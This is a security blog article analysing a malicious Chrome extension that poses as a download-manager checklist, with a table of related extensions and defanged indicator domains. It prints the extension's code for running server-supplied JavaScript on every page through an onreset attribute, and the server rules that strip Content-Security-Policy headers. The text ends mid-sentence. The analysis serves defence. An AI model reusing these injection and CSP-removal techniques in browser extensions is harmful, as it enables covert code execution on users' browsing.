---
title: Analysis of an advanced malicious Chrome extension
url: https://palant.info/2025/02/03/analysis-of-an-advanced-malicious-chrome-extension/
source: Over Security - Cybersecurity news aggregator
date: 2025-02-04
fetch_date: 2025-10-06T20:40:14.538952
---

# Analysis of an advanced malicious Chrome extension

[Almost Secure](/)

* [Home](/)
* [Articles](/articles/)
* [Categories](/categories/)
* [About](/about/)
* ##

  Read More Â»

[ ]

# Analysis of an advanced malicious Chrome extension

2025-02-03
 [Add-Ons](/categories/add-ons/)/[Security](/categories/security/)/[Google](/categories/google/)
 11 mins
 [4 comments](/2025/02/03/analysis-of-an-advanced-malicious-chrome-extension/#comments)

Two weeks ago I published [an article on 63 malicious Chrome extensions](/2025/01/20/malicious-extensions-circumvent-googles-remote-code-ban/). In most cases I could only identify the extensions as malicious. With large parts of their logic being downloaded from some web servers, it wasnât possible to analyze their functionality in detail.

However, for the Download Manager Integration Checklist extension I have all parts of the puzzle now. This article is a technical discussion of its functionality that somebody tried very hard to hide. I was also able to identify a number of related extensions that were missing from my previous article.

**Update** (2025-02-04): An update to Download Manager Integration Checklist extension has been released a day before I published this article, clearly prompted by me asking adindex about this. The update removes the malicious functionality and clears extension storage. Luckily, Iâve saved both the previous version and its storage contents.

![Screenshot of an extension pop-up. The text in the popup says âSeamlessly integrate the renowned Internet Download Manager (IDM) with Google Chrome, all without the need for dubious third-party extensionsâ followed up with some instructions.](/2025/02/03/analysis-of-an-advanced-malicious-chrome-extension/popup.png)

#### Contents

* [The problematic extensions](#the-problematic-extensions)
* [âRemote configurationâ functionality](#remote-configuration-functionality)
* [The code being executed](#the-code-being-executed)
* [The âsessionâ handling](#the-session-handling)
* [Who is behind these extensions?](#who-is-behind-these-extensions)

## The problematic extensions

Since my previous article I found a bunch more extensions with malicious functionality that is almost identical to Download Manager Integration Checklist. The extension Auto Resolution Quality for YouTubeâ¢ does not seem to be malicious (yet?) but shares many remarkable oddities with the other extensions.

| Name | Weekly active users | Extension ID | Featured |
| --- | --- | --- | --- |
| Freemybrowser | 10,000 | bibmocmlcdhadgblaekimealfcnafgfn | â |
| AutoHD for Twitchâ¢ | 195 | didbenpmfaidkhohcliedfmgbepkakam |  |
| Free simple Adult Blocker with password | 1,000 | fgfoepffhjiinifbddlalpiamnfkdnim |  |
| Convert PDF to JPEG/PNG | 20,000 | fkbmahbmakfabmbbjepgldgodbphahgc |  |
| Download Manager Integration Checklist | 70,000 | ghkcpcihdonjljjddkmjccibagkjohpi | â |
| Auto Resolution Quality for YouTubeâ¢ | 223 | hdangknebhddccoocjodjkbgbbedeaam |  |
| Adblock.mx - Adblock for Chrome | 1,000 | hmaeodbfmgikoddffcfoedogkkiifhfe | â |
| Auto Quality for YouTubeâ¢ | 100,000 | iaddfgegjgjelgkanamleadckkpnjpjc |  |
| Anti phising safer browsing for chrome | 7,000 | jkokgpghakemlglpcdajghjjgliaamgc | â |
| Darktheme for google translate | 40,000 | nmcamjpjiefpjagnjmkedchjkmedadhc | â |

Additional IOCs:

* adblock[.]mx
* adultblocker[.]org
* autohd[.]org
* autoresolutionquality[.]com
* browserguard[.]net
* freemybrowser[.]com
* freepdfconversion[.]com
* internetdownloadmanager[.]top
* megaxt[.]com
* darkmode[.]site

## âRemote configurationâ functionality

The Download Manager Integration Checklist extension was an odd one on the list in [my previous article](/2025/01/20/malicious-extensions-circumvent-googles-remote-code-ban/). It has very minimal functionality: itâs merely supposed to display a set of instructions. This is a task that doesnât require any permissions at all, yet the extension requests access to all websites and `declarativeNetRequest` permission. Apparently, nobody noticed this inconsistency so far.

Looking at the extension code, there is another oddity. The checklist displayed by the extension is downloaded from Firebase, Googleâs online database. Yet there is also a download from `https://help.internetdownloadmanager.top/checklist`, with the response being handled by this function:

```
async function u(l) {
  await chrome.storage.local.set({ checklist: l });

  await chrome.declarativeNetRequest.updateDynamicRules({
    addRules: l.list.add,
    removeRuleIds: l.list.rm,
  });
}
```

This is what I flagged as malicious functionality initially: part of the response is used to add `declarativeNetRequest` rules dynamically. At first I missed something however: the rest of the data being stored as `checklist` is also part of the malicious functionality, allowing execution of remote code:

```
function f() {
  let doc = document.documentElement;
  function updateHelpInfo(info, k) {
    doc.setAttribute(k, info);
    doc.dispatchEvent(new CustomEvent(k.substring(2)));
    doc.removeAttribute(k);
  }

  document.addEventListener(
    "description",
    async ({ detail }) => {
      const response = await chrome.runtime.sendMessage(
        detail.msg,
      );
      document.dispatchEvent(
        new CustomEvent(detail.responseEvent, {
          detail: response,
        }),
      );
    },
  );

  chrome.storage.local.get("checklist").then(
    ({ checklist }) => {
      if (checklist && checklist.info && checklist.core) {
        updateHelpInfo(checklist.info, checklist.core);
      }
    },
  );
}
```

There is a [tabs.onUpdated](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/tabs/onUpdated) listener hidden within the legitimate `webextension-polyfill` module that will run this function for every web page via [tabs.executeScript API](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/tabs/executeScript).

This function looks fairly unsuspicious. Understanding its functionality is easier if you know that `checklist.core` is `"onreset"`. So it takes the document element, fills its `onreset` attribute with some JavaScript code from `checklist.info`, triggers the `reset` event and removes the attribute again. Thatâs how this extension runs some server-provided code in the context of every website.

## The code being executed

When the extension downloads its âchecklistâ immediately after installation the server response will be empty. Sort of: ânothing to see here, this is merely some dead code somebody forgot to remove.â The server sets a cookie however, allowing it to recognize the user on subsequent downloads. And only after two weeks or so it will respond with the real thing. For example, the `list` key of the response looks like this then:

```
"add": [
  {
    "action": {
      "responseHeaders": [
        {
          "header": "Content-Security-Policy-Report-Only",
          "operation": "remove"
        },
        {
          "header": "Content-Security-Policy",
          "operation": "remove"
        }
      ],
      "type": "modifyHeaders"
    },
    "condition": {
      "resourceTypes": [
        "main_frame"
      ],
      "urlFilter": "*"
    },
    "id": 98765432,
    "priority": 1
  }
],
"rm": [
  98765432
]
```

No surprise here, this is about removing [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) protection from all websites, making sure it doesnât interfere when the extension injects its code into web pages.

As I already mentioned, the `core` key of the response is `"onreset"`, an essential component towards executing the JavaScript code. And the JavaScript code in the `info` key is heavily obfuscated by [JavaScript Obfuscator](https://github.com/javascript-obfuscator/javascript-obfuscator/), with most strings and property names encrypted to make reverse engineering harder.

Of course this kind of obfuscation can still be reversed, and you can see the entire d...